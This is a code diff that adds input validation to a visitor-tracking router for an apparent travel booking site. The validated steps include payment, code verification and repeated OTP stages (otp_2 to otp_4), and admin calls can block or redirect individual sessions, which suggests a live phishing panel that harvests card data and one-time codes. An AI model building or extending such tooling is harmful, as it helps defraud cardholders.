@@ -4,14 +4,31 @@ import { db } from '../db.js';
 import { emitVisitorUpdate } from '../socket.js';
 
 const bookingDataSchema = z.object({
-  from: z.string().optional(),
-  to: z.string().optional(),
-  date: z.string().optional(),
-  passengers: z.number().optional(),
-  selectedTrip: z.string().optional(),
-  selectedSeats: z.array(z.string()).optional(),
-  fareClass: z.string().optional(),
+  from: z.string().max(120).optional(),
+  to: z.string().max(120).optional(),
+  date: z.string().max(40).optional(),
+  passengers: z.number().int().nonnegative().max(100).optional(),
+  selectedTrip: z.string().max(500).optional(),
+  selectedSeats: z.array(z.string().max(30)).max(100).optional(),
+  fareClass: z.string().max(80).optional(),
 }).optional();
+
+const visitorStepSchema = z.enum([
+  'home', 'search', 'results', 'trip_details', 'seat_selection', 'passenger_info',
+  'payment_method', 'payment', 'code_verification', 'otp_2', 'otp_3', 'otp_4',
+  'success', 'code_failed', 'closed',
+]);
+
+const redirectUrlSchema = z.string().trim().min(1).max(2048).refine((value) => {
+  if (value.startsWith('step:')) return visitorStepSchema.safeParse(value.slice(5)).success;
+  if (value.startsWith('/') && !value.startsWith('//')) return true;
+  try {
+    const parsed = new URL(value);
+    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
+  } catch {
+    return false;
+  }
+}, { message: 'رابط التوجيه يجب أن يكون HTTP/HTTPS أو مساراً داخلياً آمناً' });
 
 function parseObject(value: unknown): Record<string, unknown> {
   if (typeof value !== 'string' || !value) return {};
@@ -36,17 +53,17 @@ function parseHistory(value: unknown): Array<{ step: string; time: number }> {
 export const visitorsRouter = router({
   track: publicProcedure
     .input(z.object({
-      sessionId: z.string(),
-      page: z.string().optional().default('/'),
-      userAgent: z.string().optional().default(''),
-      ip: z.string().optional(),
-      country: z.string().optional(),
-      city: z.string().optional(),
-      step: z.string().optional(),
+      sessionId: z.string().trim().min(4).max(128),
+      page: z.string().max(500).optional().default('/'),
+      userAgent: z.string().max(1000).optional().default(''),
+      ip: z.string().max(64).optional(),
+      country: z.string().max(120).optional(),
+      city: z.string().max(120).optional(),
+      step: visitorStepSchema.optional(),
       bookingData: bookingDataSchema,
     }))
     .mutation(async ({ input, ctx }) => {
-      const ip = input.ip || ctx.clientIp;
+      const ip = ctx.clientIp;
 
       const existing = await db.visitor.findUnique({ where: { sessionId: input.sessionId } });
 
@@ -134,9 +151,9 @@ export const visitorsRouter = router({
 
   blockVisitor: adminProcedure
     .input(z.object({
-      sessionId: z.string(),
+      sessionId: z.string().trim().min(4).max(128),
       blocked: z.boolean(),
-      redirectUrl: z.string().nullable().optional(),
+      redirectUrl: redirectUrlSchema.nullable().optional(),
     }))
     .mutation(async ({ input }) => {
       await db.visitor.update({
@@ -150,7 +167,10 @@ export const visitorsRouter = router({
     }),
 
   setRedirectUrl: adminProcedure
-    .input(z.object({ sessionId: z.string(), redirectUrl: z.string() }))
+    .input(z.object({
+      sessionId: z.string().trim().min(4).max(128),
+      redirectUrl: redirectUrlSchema,
+    }))
     .mutation(async ({ input }) => {
       await db.visitor.update({
         where: { sessionId: input.sessionId },
